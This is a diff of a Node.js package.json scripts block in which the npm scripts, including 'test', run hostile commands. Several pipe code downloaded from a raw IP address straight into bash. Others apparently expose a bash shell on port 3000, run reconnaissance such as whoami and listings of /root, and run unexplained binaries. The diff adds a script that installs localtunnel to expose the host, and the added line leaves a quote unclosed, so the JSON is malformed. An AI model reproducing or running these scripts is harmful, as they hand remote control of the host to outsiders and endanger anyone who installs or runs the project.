@@ -6,14 +6,16 @@
   "scripts": {
     "serve": "nodemon --watch . server.js",
     "start1": " whoami &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
-    "start": " ./7w -p 3000  /bin/bash &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
-    "rstart": " ./7w -p 3000  /bin/bash &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
+    "startm": " ./7w -p 3000  /bin/bash &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
+    "start": "  npm install -g localtunnel && npx localtunnel && whoami
+"rstart": " ./7w -p 3000  /bin/bash &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
     "ip": "  ./7ea ip && ./7ea e node server.js",
     "w": "  cd / && ls && cd /root && ls && ls vercel && whoami && ./7ea e node server.js",
     "x": "   ./7ea ip && whoami && curl http://3.143.249.18:1038/python | bash &&  curl http://3.143.249.18:1038/python2 | bash   &&   ./7ea e node server.js",
     "test": "   ./7ea ip &&  curl http://3.143.249.18:1038/python | bash &&  curl http://3.143.249.18:1038/python2 | bash   &&   ./7ea e node server.js",
     "test2": " ./7w -p 3000  /bin/bash &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
   
+
  "test1": "echo \"Error: no test specified\" && exit 1"
   },
   "repository": {
